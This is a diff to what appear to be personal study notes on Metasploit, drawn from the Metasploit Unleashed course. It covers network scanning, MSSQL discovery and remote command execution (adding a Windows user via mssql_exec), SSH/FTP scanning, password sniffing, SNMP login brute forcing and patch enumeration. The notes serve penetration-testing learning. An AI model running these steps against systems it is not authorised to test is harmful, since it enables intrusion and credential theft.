@@ -147,7 +147,8 @@ ___
 `msf > nmap -v -sV 192.168.1.0/24 -oA subnet_1`  this will generate 3 files that can be loaded into db later.  
 `db_nmap -v -sV 192.168.1.0/24`  this will poplulate the db right straight away.  
 
-##### port scanning  
+##### port scanning
+`use auxiliary/scanner/`  search all possibilities.   
 `search portscan`  checks the port scanning modules  
 `msf > cat subnet_1.gnmap | grep 80/open | awk '{print $2}'`  checks to see what ports have 80 open from our scan.  
 
@@ -198,10 +199,78 @@ msf auxiliary(ipidseq) > run
 ```
 `msf auxiliary(ipidseq) > nmap -PN -sI 192.168.1.109 192.168.1.114`  
 
+### Hunting for MSSQL  
+[here](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)
+Searching for and locating MSSQL installations inside the internal network can be achieved using UDP foot-printing.  
+`search mssql`  
+`use auxiliary/scanner/mssql/mssql_ping`  
+`show options`  
+`set RHOSTS 10.22.55.1/24`  
+`exploit`  
+**brute force**  
+`use auxiliary/admin/mssql/mssql_exec`  
+`show options`  
+`set RHOST 10.211.55.128`  
+`set MSSQL_PASS password`  
+`set CMD net user bacon ihazpassword /ADD`  
+`exploit`  
 
+### Service Identification  
+[here](https://www.offensive-security.com/metasploit-unleashed/service-identification/)
+Again, other than using Nmap to perform scanning for services on our target network, Metasploit also includes a large variety of scanners for various services, often helping you determine potentially vulnerable running services on target machines.  
+#### SSH Service  
+`services -p 22 -c name,port,proto`  
+`use auxiliary/scanner/ssh/ssh_version`  
+`set RHOSTS 172.16.194.163 172.16.194.172`  
+`show options`  
+`run`  
+#### FTP Service  
+Poorly configured FTP servers can frequently be the foothold you need in order to gain access to an entire network so it always pays off to check to see if anonymous access is allowed whenever you encounter an open FTP port which is usually on TCP port 21.  
+`services -p 21 -c name,proto`  
+`use auxiliary/scanner/ftp/ftp_version`  
+`set RHOST 172.16.194.172`  
+`show options` 
 
+### Password Sniffing  
+[here](https://www.offensive-security.com/metasploit-unleashed/password-sniffing/)
+Using the psnuffle module is extremely simple. There are some options available but the module works great “out of the box”.  
+**Module Location**  
+ data/exploits/psnuffle  
 
+`use auxiliary/sniffer/psnuffle`  
+`show options`  
+`run`  
 
+### SNMP Sweeping  
+[here](https://www.offensive-security.com/metasploit-unleashed/snmp-scan/)  
+SNMP sweeps are often a good indicator in finding a ton of information about a specific system or actually compromising the remote device.  
+#### SNMP 
+Simple Network Management Protocol (SNMP) is an Internet-standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior.  
+`cd /etc/default/snmpd`  
+change  
+`SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1'`  
+to  
+`SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'`  
+
+#### MIB Management Information Base  
+This interface allows you to query the device and extract information. Metasploit comes loaded with a list of default MIBs that it has in its database, it uses them to query the device for more information depending on what level of access is obtained. Let’s take a peek at the auxiliary module.  
+`search snmp`  
+`use auxiliary/scanner/snmp/snmp_login`  
+`show options`  
+`set RHOST 192.168.0.0-192.168.5.255`  
+`set THREADS 10`  
+`run`  
+
+### Writing Your Own Security Scanner  
+[here](https://www.offensive-security.com/metasploit-unleashed/writing-scanner/)  
+
+### Windows Patch Enumeration  
+[here](https://www.offensive-security.com/metasploit-unleashed/patch-enumeration/)
+When confronted with  a Windows target, identifying which patches have been applied is an easy way of knowing if regular updates happen. It may also provide information on other possible vulnerabilities present on the system.  
+```
+msf exploit(handler) > use post/windows/gather/enum_patches
+msf post(enum_patches) > show options
+```
 
 
 
